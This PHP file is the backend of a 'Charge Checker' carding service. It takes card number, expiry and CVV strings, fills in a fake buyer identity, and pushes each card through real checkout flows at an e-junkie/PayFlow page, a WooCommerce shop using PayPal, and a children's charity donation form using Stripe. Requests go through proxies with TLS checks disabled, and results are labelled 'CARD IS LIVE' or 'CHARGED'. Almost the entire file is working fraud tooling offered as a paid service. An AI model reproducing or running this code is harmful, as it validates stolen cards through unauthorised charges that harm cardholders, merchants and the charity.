<?php
// Charge Checker API Endpoint
// Handles PayFlow AVS, Direct Charge, and Stripe Donate

require_once __DIR__ . '/../includes/config.php';

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

if (!isLoggedIn()) {
    echo json_encode(['success' => false, 'error' => 'Not logged in']);
    exit;
}

$action = $_POST['action'] ?? '';
$gate = $_POST['gate'] ?? 'payflow';
$cc = trim($_POST['cc'] ?? '');
$proxy = trim($_POST['proxy'] ?? '');

if ($action === 'process_charge') {
    if (empty($cc)) {
        echo json_encode(['success' => false, 'error' => 'No card provided']);
        exit;
    }
    
    if ($gate === 'payflow') {
        $result = processPayFlowAVS($cc, $proxy);
    } elseif ($gate === 'direct') {
        $result = processDirectCharge($cc, $proxy);
    } elseif ($gate === 'stripe') {
        $result = processStripeDonate($cc, $proxy);
    } else {
        $result = ['success' => false, 'error' => 'Invalid gate'];
    }
    
    // Deduct credit if approved
    if ($result['success'] && $result['status'] === 'approved') {
        $user = $_SESSION['user'];
        if (!isAdmin() && isset($user['name'])) {
            deductCredits(1, "Charge Checker ({$gate}) - " . substr($cc, 0, 15), substr($cc, 0, 15));
        }
    }
    
    echo json_encode($result);
    exit;
}

echo json_encode(['success' => false, 'error' => 'Invalid action']);
exit;

function processPayFlowAVS($cc, $proxy) {
    // Parse card details
    $parts = explode('|', $cc);
    if (count($parts) < 4) {
        return ['success' => false, 'error' => 'Invalid card format'];
    }
    
    list($cardNumber, $month, $year, $cvv) = array_map('trim', $parts);
    
    if (strlen($year) == 2) $year = '20' . $year;
    
    // Generate random user data
    $firstNames = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth"];
    $lastNames = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"];
    
    $firstName = $firstNames[array_rand($firstNames)];
    $lastName = $lastNames[array_rand($lastNames)];
    $email = strtolower($firstName) . rand(100, 999) . "@gmail.com";
    $phone = "1" . rand(200, 999) . rand(1000000, 9999999);
    $street = rand(100, 999) . " Main St";
    $city = "New York";
    $state = "NY";
    $zip = "10001";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.e-junkie.com/ecom/gb.php?&i=pdf:SJ&cl=246605&c=cc&ejc=4&custom=card");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    // Extract ec_url
    preg_match('/ec_url=([^&"]+)/', $response, $urlMatch);
    if (empty($urlMatch)) {
        return ['success' => true, 'status' => 'declined', 'message' => 'Failed to initialize', 'gateway' => 'PayFlow AVS $3.99'];
    }
    
    $ecUrl = urldecode($urlMatch[1]);
    
    // Extract cart_md5 and cart_id
    preg_match('/cart_md5=([^&]+)/', $ecUrl, $md5Match);
    preg_match('/cart_id=([^&]+)/', $ecUrl, $idMatch);
    
    $cartMd5 = $md5Match[1] ?? '';
    $cartId = $idMatch[1] ?? '';
    
    // Step 2: Get CSRF and tokens
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.e-junkie.com/ecom/ccv3/?client_id=246605&cart_id={$cartId}&cart_md5={$cartMd5}&c=cc&ejc=4&");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36");
    if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    // Extract CSRF_TOKEN
    preg_match('/name="CSRF_TOKEN" value="([^"]+)"/', $response, $csrfMatch);
    $csrfToken = $csrfMatch[1] ?? '';
    
    // Step 3: Post to ppadvanced.php
    $params = [
        'client_id' => '246605',
        'cart_id' => $cartId,
        'cart_md5' => $cartMd5,
        'page_ln' => 'en',
        'cb' => '1772049417',
        'ec_url' => "https://www.e-junkie.com/ecom/gbv3.php?c=cart&ejc=2&cl=246605&cart_id={$cartId}&cart_md5={$cartMd5}&cart_currency=USD"
    ];
    
    $postData = "ts=1772049418363&amount=3.99&cur=USD&cart_id={$cartId}&cart_md5={$cartMd5}&address_same=false&em_updates=false&email=" . urlencode($email) . "&name=" . urlencode($firstName . " " . $lastName) . "&fname={$firstName}&lname={$lastName}&company_name=None&phone={$phone}&address=" . urlencode($street) . "&address2=&city={$city}&state={$state}&zip={$zip}&country=US&shipping_name&shipping_fname&shipping_lname&shipping_company_name&shipping_phone&shipping_address&shipping_address2&shipping_city&shipping_country=US&shipping_state&shipping_zip&buyerNotes";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.e-junkie.com/ecom/ppadvanced.php?" . http_build_query($params));
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36");
    if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    // Extract SECURETOKEN and SECURETOKENID
    preg_match('/name="SECURETOKEN" value="([^"]+)"/', $response, $tokenMatch);
    preg_match('/name="SECURETOKENID" value="([^"]+)"/', $response, $tokenIdMatch);
    
    $secureToken = $tokenMatch[1] ?? '';
    $secureTokenId = $tokenIdMatch[1] ?? '';
    
    if (empty($secureToken) || empty($secureTokenId)) {
        return ['success' => true, 'status' => 'declined', 'message' => 'Failed to get payment token', 'gateway' => 'PayFlow AVS $3.99'];
    }
    
    // Step 4: Get PayPal CSRF
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://payflowlink.paypal.com/?&SECURETOKENID={$secureTokenId}&SECURETOKEN={$secureToken}");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36");
    if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    preg_match('/name="CSRF_TOKEN" value="([^"]+)"/', $response, $csrfPaypalMatch);
    $csrfPaypal = $csrfPaypalMatch[1] ?? '';
    
    // Step 5: Submit card
    $postData = "subaction&CARDNUM={$cardNumber}&EXPMONTH={$month}&EXPYEAR=" . substr($year, -2) . "&CVV2={$cvv}&startdate_month&startdate_year&issue_number&METHOD=C&PAYMETHOD=C&FIRST_NAME={$firstName}&LAST_NAME={$lastName}&template=MINLAYOUT&ADDRESS=" . urlencode($street) . "&CITY={$city}&STATE={$state}&ZIP={$zip}&COUNTRY=US&PHONE={$phone}&EMAIL=" . urlencode($email) . "&SHIPPING_FIRST_NAME&SHIPPING_LAST_NAME&ADDRESSTOSHIP&CITYTOSHIP&STATETOSHIP&ZIPTOSHIP&COUNTRYTOSHIP&PHONETOSHIP&EMAILTOSHIP&TYPE=S&SHIPAMOUNT=0.00&TAX=0.00&INVOICE={$secureTokenId}&DISABLERECEIPT=TRUE&flag3dSecure&CURRENCY=USD&STATE={$state}&EMAILCUSTOMER=FALSE&swipeData=0&SECURETOKEN={$secureToken}&SECURETOKENID={$secureTokenId}&PARMLIST&MODE&CSRF_TOKEN={$csrfPaypal}&referringTemplate=minlayout";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://payflowlink.paypal.com/processTransaction.do");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36");
    if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    // Parse results
    preg_match('/name="RESULT" value="([^"]+)"/', $response, $resultMatch);
    preg_match('/name="RESPMSG" value="([^"]+)"/', $response, $msgMatch);
    preg_match('/name="AVSDATA" value="([^"]+)"/', $response, $avsMatch);
    preg_match('/name="CVV2MATCH" value="([^"]+)"/', $response, $cvvMatch);
    
    $result = $resultMatch[1] ?? '0';
    $message = $msgMatch[1] ?? 'Unknown';
    $avs = $avsMatch[1] ?? 'N/A';
    $cvv = $cvvMatch[1] ?? 'N/A';
    
    // Result 0 = Approved
    if ($result === '0') {
        return [
            'success' => true,
            'status' => 'approved',
            'message' => "APPROVED - {$message}",
            'gateway' => 'PayFlow AVS $3.99',
            'avs' => $avs,
            'cvv' => $cvv
        ];
    } else {
        // Check for LIVE indicators
        $liveIndicators = ['cvv2_failure', 'invalid_security_code', 'insufficient_funds'];
        foreach ($liveIndicators as $indicator) {
            if (stripos($message, $indicator) !== false) {
                return [
                    'success' => true,
                    'status' => 'approved',
                    'message' => "CARD IS LIVE - {$message}",
                    'gateway' => 'PayFlow AVS $3.99',
                    'avs' => $avs,
                    'cvv' => $cvv
                ];
            }
        }
        
        return [
            'success' => true,
            'status' => 'declined',
            'message' => "DECLINED - {$message}",
            'gateway' => 'PayFlow AVS $3.99',
            'avs' => $avs,
            'cvv' => $cvv
        ];
    }
}

function processDirectCharge($cc, $proxy) {
    // Parse card details
    $parts = explode('|', $cc);
    if (count($parts) < 4) {
        return ['success' => false, 'error' => 'Invalid card format'];
    }
    
    list($cardNumber, $month, $year, $cvv) = array_map('trim', $parts);
    
    if (strlen($year) == 2) $year = '20' . $year;
    $yearTwoDigit = substr($year, -2);
    $month = str_pad($month, 2, '0', STR_PAD_LEFT);
    
    // Generate random user data
    $firstNames = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth"];
    $lastNames = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"];
    
    $firstName = $firstNames[array_rand($firstNames)];
    $lastName = $lastNames[array_rand($lastNames)];
    $email = strtolower($firstName) . rand(100, 999) . "@gmail.com";
    $phone = "1" . rand(200, 999) . rand(1000000, 9999999);
    $street = rand(100, 999) . " Main St";
    $city = "New York";
    $state = "NY";
    $zip = "10001";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://switchupcb.com/shop/i-buy/");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "quantity=1&add-to-cart=4451");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_exec($ch);
    curl_close($ch);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://switchupcb.com/checkout/");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);
    $response = curl_exec($ch);
    curl_close($ch);
    
    preg_match('/update_order_review_nonce":"([^"]+)"/', $response, $secMatch);
    preg_match('/name="woocommerce-process-checkout-nonce" value="([^"]+)"/', $response, $checkMatch);
    preg_match('/create_order.*?nonce":"([^"]+)"/', $response, $createMatch);
    
    $sec = $secMatch[1] ?? '';
    $check = $checkMatch[1] ?? '';
    $create = $createMatch[1] ?? '';
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://switchupcb.com/?wc-ajax=update_order_review");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "security={$sec}&payment_method=stripe&country=US&state={$state}&postcode={$zip}&city=" . urlencode($city) . "&address=" . urlencode($street) . "&billing_first_name={$firstName}&billing_last_name={$lastName}&billing_phone={$phone}&billing_email=" . urlencode($email) . "&terms-field=1&woocommerce-process-checkout-nonce={$check}");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_exec($ch);
    curl_close($ch);
    
    $formEncoded = "billing_first_name={$firstName}&billing_last_name={$lastName}&billing_company=&billing_country=US&billing_address_1=" . urlencode($street) . "&billing_address_2=&billing_city=" . urlencode($city) . "&billing_state={$state}&billing_postcode={$zip}&billing_phone={$phone}&billing_email=" . urlencode($email) . "&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={$check}&ppcp-funding-source=card";
    
    $jsonData = json_encode([
        'nonce' => $create,
        'payer' => null,
        'bn_code' => 'Woo_PPCP',
        'context' => 'checkout',
        'order_id' => '0',
        'payment_method' => 'ppcp-gateway',
        'funding_source' => 'card',
        'form_encoded' => $formEncoded,
        'createaccount' => false,
        'save_payment_method' => false
    ]);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://switchupcb.com/?wc-ajax=ppc-create-order");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $orderData = json_decode($response, true);
    $orderId = $orderData['data']['id'] ?? '';
    
    if (empty($orderId)) {
        return ['success' => true, 'status' => 'declined', 'message' => 'Failed to create order', 'gateway' => 'Direct Charge $2'];
    }
    
    $graphqlQuery = 'mutation payWithCard($token: String!, $card: CardInput!, $firstName: String, $lastName: String, $billingAddress: AddressInput, $email: String) { approveGuestPaymentWithCreditCard(token: $token, card: $card, firstName: $firstName, lastName: $lastName, email: $email, billingAddress: $billingAddress) { flags { is3DSecureRequired } } }';
    
    $cardType = preg_match('/^4/', $cardNumber) ? 'VISA' : (preg_match('/^5/', $cardNumber) ? 'MASTER_CARD' : 'VISA');
    
    $variables = [
        'token' => $orderId,
        'card' => [
            'cardNumber' => $cardNumber,
            'type' => $cardType,
            'expirationDate' => "{$month}/{$yearTwoDigit}",
            'postalCode' => $zip,
            'securityCode' => $cvv
        ],
        'firstName' => $firstName,
        'lastName' => $lastName,
        'email' => $email,
        'billingAddress' => [
            'givenName' => $firstName,
            'familyName' => $lastName,
            'line1' => $street,
            'city' => $city,
            'state' => $state,
            'postalCode' => $zip,
            'country' => 'US'
        ]
    ];
    
    $graphqlPayload = json_encode(['query' => $graphqlQuery, 'variables' => $variables]);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.paypal.com/graphql");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $graphqlPayload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json', "Paypal-Client-Context: {$orderId}"]);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $responseUpper = strtoupper($response);
    
    if (strpos($responseUpper, 'APPROVED') !== false || strpos($responseUpper, '"STATUS":"SUCCEEDED"') !== false) {
        return ['success' => true, 'status' => 'approved', 'message' => 'CHARGED $2 🔥', 'gateway' => 'Direct Charge $2'];
    } elseif (strpos($responseUpper, 'IS3DSECUREREQUIRED') !== false || strpos($responseUpper, '3DS') !== false) {
        return ['success' => true, 'status' => 'approved', 'message' => '3D Secure Required (LIVE Card)', 'gateway' => 'Direct Charge $2'];
    } elseif (strpos($responseUpper, 'INVALID_SECURITY_CODE') !== false) {
        return ['success' => true, 'status' => 'approved', 'message' => 'APPROVED CCN (CVV Failed)', 'gateway' => 'Direct Charge $2'];
    } elseif (strpos($responseUpper, 'INVALID_BILLING_ADDRESS') !== false) {
        return ['success' => true, 'status' => 'approved', 'message' => 'APPROVED - AVS', 'gateway' => 'Direct Charge $2'];
    } elseif (strpos($responseUpper, 'INSUFFICIENT_FUNDS') !== false) {
        return ['success' => true, 'status' => 'approved', 'message' => 'INSUFFICIENT FUNDS (LIVE Card)', 'gateway' => 'Direct Charge $2'];
    } elseif (strpos($responseUpper, 'CARD_DECLINED') !== false) {
        return ['success' => true, 'status' => 'declined', 'message' => 'Card Declined', 'gateway' => 'Direct Charge $2'];
    } elseif (strpos($responseUpper, 'EXPIRED') !== false) {
        return ['success' => true, 'status' => 'declined', 'message' => 'Card Expired', 'gateway' => 'Direct Charge $2'];
    } else {
        return ['success' => true, 'status' => 'declined', 'message' => 'Card Declined', 'gateway' => 'Direct Charge $2'];
    }
}

function processStripeDonate($cc, $proxy) {
    // Parse card details
    $parts = explode('|', $cc);
    if (count($parts) < 4) {
        return ['success' => false, 'error' => 'Invalid card format'];
    }
    
    list($cardNumber, $month, $year, $cvv) = array_map('trim', $parts);
    
    if (strlen($year) == 2) $year = '20' . $year;
    $yearTwoDigit = substr($year, -2);
    $month = str_pad($month, 2, '0', STR_PAD_LEFT);
    
    // Generate random user data
    $firstNames = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth"];
    $lastNames = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"];
    
    $firstName = $firstNames[array_rand($firstNames)];
    $lastName = $lastNames[array_rand($lastNames)];
    $email = strtolower($firstName) . rand(100, 999) . "@gmail.com";
    $street = rand(100, 999) . " Main St";
    $city = "New York";
    $state = "NY";
    $zip = "10001";
    
    // Step 1: Get donation page
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://ourkidsatheart.com/donate-now-austin-chapter/");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36");
    if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);
    $response = curl_exec($ch);
    curl_close($ch);
    
    // Extract form data
    preg_match('/name="give-form-id" value="([^"]+)"/', $response, $formIdMatch);
    preg_match('/name="give-form-id-prefix" value="([^"]+)"/', $response, $prefixMatch);
    preg_match('/name="give-form-hash" value="([^"]+)"/', $response, $hashMatch);
    preg_match('/name="give-form-user-register-hash" value="([^"]+)"/', $response, $registerMatch);
    preg_match('/data-account="([^"]+)"/', $response, $acctMatch);
    preg_match('/data-publishable-key="([^"]+)"/', $response, $pkMatch);
    
    $formId = $formIdMatch[1] ?? '';
    $prefix = $prefixMatch[1] ?? '';
    $hash = $hashMatch[1] ?? '';
    $register = $registerMatch[1] ?? '';
    $acct = $acctMatch[1] ?? '';
    $pkLive = $pkMatch[1] ?? '';
    
    if (empty($pkLive)) {
        return ['success' => true, 'status' => 'declined', 'message' => 'Failed to get Stripe keys', 'gateway' => 'Stripe Donate $5'];
    }
    
    // Step 2: Create payment method via Stripe API
    $stripeHeaders = [
        "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
        "Accept: application/json",
        "Content-Type: application/x-www-form-urlencoded",
        "Origin: https://js.stripe.com",
        "Referer: https://js.stripe.com/"
    ];
    
    $stripeData = http_build_query([
        'type' => 'card',
        'billing_details[name]' => $firstName . ' ' . $lastName,
        'billing_details[email]' => $email,
        'billing_details[address][line1]' => $street,
        'billing_details[address][city]' => $city,
        'billing_details[address][state]' => $state,
        'billing_details[address][postal_code]' => $zip,
        'billing_details[address][country]' => 'US',
        'card[number]' => $cardNumber,
        'card[cvc]' => $cvv,
        'card[exp_month]' => $month,
        'card[exp_year]' => $yearTwoDigit,
        'key' => $pkLive,
        '_stripe_account' => $acct
    ]);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/payment_methods");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $stripeData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $stripeHeaders);
    if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $pmData = json_decode($response, true);
    $paymentMethodId = $pmData['id'] ?? '';
    
    if (empty($paymentMethodId)) {
        $errorMsg = $pmData['error']['message'] ?? 'Payment method creation failed';
        return ['success' => true, 'status' => 'declined', 'message' => $errorMsg, 'gateway' => 'Stripe Donate $5'];
    }
    
    // Step 3: Submit donation
    $donateHeaders = [
        "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
        "Content-Type: application/x-www-form-urlencoded",
        "Origin: https://ourkidsatheart.com",
        "Referer: https://ourkidsatheart.com/donate-now-austin-chapter/"
    ];
    
    $donateData = http_build_query([
        'give-honeypot' => '',
        'give-form-id-prefix' => $prefix,
        'give-form-id' => $formId,
        'give-form-title' => 'Donate - Austin',
        'give-current-url' => 'https://ourkidsatheart.com/donate-now-austin-chapter/',
        'give-form-url' => 'https://ourkidsatheart.com/donate-now-austin-chapter/',
        'give-form-minimum' => '5.00',
        'give-form-maximum' => '999999.99',
        'give-form-hash' => $hash,
        'give-price-id' => 'custom',
        'give-amount' => '5.00',
        'give_stripe_payment_method' => $paymentMethodId,
        'payment-mode' => 'stripe',
        'give_first' => $firstName,
        'give_last' => $lastName,
        'give_email' => $email,
        'give-form-user-register-hash' => $register,
        'card_name' => $firstName,
        'billing_country' => 'US',
        'card_address' => $street,
        'card_address_2' => '',
        'card_city' => $city,
        'card_state' => $state,
        'card_zip' => $zip,
        'give_action' => 'purchase',
        'give-gateway' => 'stripe'
    ]);
    
    $params = [
        'payment-mode' => 'stripe',
        'form-id' => $formId
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://ourkidsatheart.com/donate-now-austin-chapter/?" . http_build_query($params));
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $donateData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $donateHeaders);
    if (!empty($proxy)) curl_setopt($ch, CURLOPT_PROXY, $proxy);
    $response = curl_exec($ch);
    curl_close($ch);
    
    // Check response
    if (strpos($response, 'Thank you for your donation') !== false || 
        strpos($response, 'Thank you') !== false || 
        strpos($response, 'Successfully') !== false) {
        return ['success' => true, 'status' => 'approved', 'message' => 'CHARGED $5 🔥', 'gateway' => 'Stripe Donate $5'];
    } elseif (strpos($response, 'requires_action') !== false) {
        return ['success' => true, 'status' => 'approved', 'message' => '3D Secure Required (LIVE Card)', 'gateway' => 'Stripe Donate $5'];
    } else {
        // Try to extract error message
        preg_match('/<strong>Error<\/strong>:\s*(.*?)<\/p>/', $response, $errorMatch);
        $errorMsg = $errorMatch[1] ?? 'Donation failed';
        
        // Check for LIVE indicators
        $liveIndicators = ['cvv', 'security code', 'insufficient', 'funds'];
        foreach ($liveIndicators as $indicator) {
            if (stripos($errorMsg, $indicator) !== false) {
                return ['success' => true, 'status' => 'approved', 'message' => "CARD IS LIVE - {$errorMsg}", 'gateway' => 'Stripe Donate $5'];
            }
        }
        
        return ['success' => true, 'status' => 'declined', 'message' => $errorMsg, 'gateway' => 'Stripe Donate $5'];
    }
}
?>
